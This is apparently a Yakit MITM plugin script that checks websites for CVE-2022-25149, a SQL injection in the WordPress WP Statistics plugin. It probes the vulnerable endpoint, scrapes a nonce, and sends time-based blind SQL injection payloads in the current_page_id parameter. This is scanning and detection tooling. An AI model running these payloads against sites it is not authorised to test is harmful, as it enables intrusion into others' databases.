# WordPress 插件 WP Statistics <= 13.1.5  SQL 注入
# cve_2022_25149
# FROM https://gist.github.com/Xib3rR4dAr/5dbd58b7f57a5037fe461fba8e696042

#-----------------------MITM Hooks I/O-------------------------
/*
#如何使用插件参数？

## 例如，如果你设置了一个参数为 url_keyword 的参数，可以通过 MITM_PARAMS 来使用它！
urlKeyword = MITM_PARAMS["url_keyword"]

# 如何输出给 Yakit 给用户查看？

yakit_output(i: any) // 可以只输出到 "Console 界面"
yakit_save(i: any)   // 可以输出并保存到数据库中，在 "插件输出" 中查看
*/
#----------------MITM Hooks Test And Quick Debug-----------------
/*
# __test__ 是 yakit mitm 插件用于调试的函数 【注意：这个函数在 MITM hooks劫持环境下不会被导入】

在这个函数中，你可以使用 yakit.GenerateYakitMITMHooksParams(method: string, url: string, opts ...http.Option) 来方便的生成可供 hooks 调用的参数，参考代码模版中的用法～

*/


#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "https://example.com")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results

    mirrorHTTPFlow(results...)
    mirrorFilteredHTTPFlow(results...)
    mirrorNewWebsite(results...)
    mirrorNewWebsitePath(results...)
    mirrorNewWebsitePathParams(results...)
}

check_dir_exist = func(url){
    # 检测是否存在 WP Statistics 易受攻击的端点
    target = sprintf("%v%v",url,"/index.php/wp-json/wp-statistics/v2/hit")
    # yakit.Output(target) # debug
    isHttps,packet,_ = poc.ParseUrlToHTTPRequestRaw("GET",target)
    sendPacket = func(packet) {
        return poc.HTTP(
            packet, 
            poc.timeout(10),
            # poc.proxy("http://127.0.0.1:8083"), # debug
            # poc.proxy("http://127.0.0.1:7890"),
            poc.redirectTimes(0),  # 重定向次数
            poc.https(isHttps),
        )
    }
    rsp,req,_ = sendPacket(packet)
    rspPoc,_ = poc.ParseBytesToHTTPResponse(rsp)
    status_code = rspPoc.StatusCode
    # yakit.Output(sprintf("%v",status_code)) #debug
    if status_code == 400 {
        return true
    }else {
        return false
    }

}

getUrl2POC = func(url){
    // poc 包的从url发送get请求包
    isHttps,packet,_ = poc.ParseUrlToHTTPRequestRaw("GET",url)
    sendPacket = func(packet) {
        return poc.HTTP(
            packet, 
            poc.timeout(10),
            #poc.proxy("http://127.0.0.1:8083"), # debug
            # poc.proxy("http://127.0.0.1:7890"),
            poc.redirectTimes(0),  # 重定向次数
            poc.https(isHttps),
        )
    }
    rsp,req,_ = sendPacket(packet)
    rspPoc,_ = poc.ParseBytesToHTTPResponse(rsp)
    return rspPoc,rsp,req
}

wpnonceGet = func(url){
    // 从主页中获取 wpnonce 的值
    rspPoc,rsp,req = getUrl2POC(url)
    status_code = rspPoc.StatusCode
    if status_code != 200{

        return false
    }else{
        text,_ = str.ExtractBodyFromHTTPResponseRaw(rsp)
        rsptext = string(text)
        wpnonce = re.FindSubmatch(rsptext,"wpnonce=(.*?)&")
        #yakit.Output(sprintf("wpnonceGet : %v",len(wpnonce))) #debug 
        if len(wpnonce) == 0{
            return false
        }else{
            # yakit.Output(wpnonce[1]) #debug
            return wpnonce[1]
        }

    }
    # yakit.Output(rsptext) #debug

}

# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
    # 
    if check_dir_exist(rootUrl){
        yakit.Output(" [!] Find weak endport, try to check...")
        wpnonce = wpnonceGet(rootUrl)

        if (wpnonce!=false){
            // 检测
            payloads = ["IF(1=1,SLEEP(4),1)","WAITFOR DELAY '0:0:4'","dbms_pipe.receive_message('RDS', 4)--"]
            for _,payload := range payloads{
                target = sprintf(`%v/index.php/wp-json/wp-statistics/v2/hit?_=11&_wpnonce=%v&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=%v&search_query&page_uri=/&user_id=0`,rootUrl,wpnonce,payload)
                # yakit.Output(target) #debug 
                now = time.now()
                _,rsp,req = getUrl2POC(target)

                since = time.Since(now).Seconds()
                # yakit.Output(sprintf("%v",since)) #debug 
                if (since > 4){
                    yakit.Output(sprintf(" [+] %v May be SQL!",rootUrl)) 
                    yakit_save(sprintf(" [+] %v May be SQL!",rootUrl))
                    risk.NewRisk(
                        rootUrl, risk.severity("high"), 
                        risk.title("WP Statistics <= 13.1.5  SQL 注入"),
                        risk.type("SQL注入"), risk.typeVerbose("SQL注入"),
                        risk.payload(payload), risk.details({
                            "request": req,
                            "response": rsp,
                            "url": target ,
                        }),
                    )
                    break
                }

            }
        }else{
            yakit.Output(sprintf(" [-] Can't find wpnonce from %v",rootUrl))
            return 
        }
    }else{
        yakit.Output(" [-] No find weak endport!")
        return
    }
}
